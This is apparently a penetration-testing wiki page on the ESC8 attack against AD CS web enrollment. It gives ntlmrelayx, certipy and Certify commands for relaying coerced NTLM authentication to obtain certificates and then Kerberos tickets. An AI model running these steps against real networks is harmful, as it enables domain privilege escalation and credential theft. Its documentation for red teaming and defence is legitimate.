# Web endpoint (ESC8)

## Relay servers setup

From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) can be used to conduct the ESC8 escalation scenario.
```bash
ntlmrelayx -t http://$PKI.domain.local/certsrv/certfnsh.asp --adcs --template "Template name"
```

> [!TIP]
> The certificate template flag (i.e. `--template`) can either be left blank (defaults to Machine or User whether relayed account name ends with `$`) or chosen among the certificate templates that fill the requirements.
> 
> For instance, if the relayed principal is a domain controller, the `DomainController` template must be specified.

[Certipy](https://github.com/ly4k/Certipy) can be used to enumerate information regarding the certificate templates (EKUs allowing for authentication, allowing low-priv users to enroll, etc.) and identify enabled HTTP endpoint.
```bash
# find ESC8-vulnerable CAs
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep -B20 ESC8
# find and look through enabled templates for ones that could be used for authentication
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout -enabled
```

> [!TIP]
> By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.

## 2. Authentication coercion

Just like any other NTLM relay attack, once the relay servers are running and waiting for incoming NTLM authentications, authentication coercion techniques can be used (e.g. PrinterBug, PetitPotam, PrivExchange) to force accounts/machines to authenticate to the relay servers.

## 3. Loot

Once incoming NTLM authentications are relayed and authenticated sessions abused, base64-encoded PFX certificates will be obtained and usable with Pass-the-Certificate to obtain a TGT and authenticate.

From Windows systems, the [Certify](https://github.com/GhostPack/Certify) tool can be used to enumerate enabled web endpoints (both HTTP and HTTPS).
```batch
Certify.exe cas
```

> [!WARNING]
> If web endpoints are enabled, use UNIX. Unknown if this can be done from Windows